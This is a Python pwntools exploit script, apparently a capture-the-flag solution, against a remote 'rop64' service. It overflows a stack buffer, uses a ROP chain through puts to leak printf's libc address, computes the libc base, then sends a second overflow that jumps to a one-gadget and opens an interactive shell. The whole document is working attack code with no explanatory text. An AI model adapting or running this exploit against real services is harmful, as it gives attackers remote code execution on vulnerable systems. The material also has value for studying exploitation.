from pwn import *
def slog(title,context): log.success(f'{title} : {hex(context)}')

p = remote("realsung.kr", 13340)
e = ELF("./rop64")
libc = ELF("./libc.so.6")
pop_rdi = 0x0000000000400753
oneshot = [0x4f3d5, 0x4f432, 0x10a41c]

payload = b''
payload += b'A' * 112 + b'B' * 0x8
payload += p64(pop_rdi)
payload += p64(e.got['printf'])
payload += p64(e.plt['puts'])
payload += p64(e.sym['main'])
p.sendlineafter(b"MSG : ", payload)

leak = u64(p.recvline().strip().ljust(8, b'\x00'))
slog('leak',leak)

libc_base = leak - libc.sym[b'printf']
system = libc_base + libc.sym[b'system']
binsh = libc_base + list(libc.search(b'/bin/sh\x00'))[0]
onegadget = libc_base + oneshot[0]
slog('libc_base',libc_base)
slog('system',system)
slog('binsh',binsh)

payload = b''
payload += b'A' * 112 + b'B' * 0x8
payload += p64(onegadget)

p.sendlineafter(b"MSG : ", payload)

p.interactive()